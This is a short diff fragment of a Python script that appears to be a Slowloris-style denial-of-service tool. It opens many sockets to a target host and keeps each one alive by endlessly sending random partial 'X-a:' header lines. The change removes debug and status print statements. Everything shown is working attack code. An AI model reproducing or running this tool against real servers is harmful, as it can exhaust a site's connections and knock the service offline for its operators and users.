@@ -35,7 +35,6 @@ if __name__ == "__main__":
 
     for _ in range(count):
         try:
-            #print("Socket {}".format(_))
             sock = socketInitialization(host)
         except socket.error:
             break
@@ -43,8 +42,6 @@ if __name__ == "__main__":
         sockets.append(sock)
 
     while True:
-        print("Connected to {} sockets. Sending headers...".format(len(sockets)))
-
         for sock in list(sockets):
             try:
                 sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
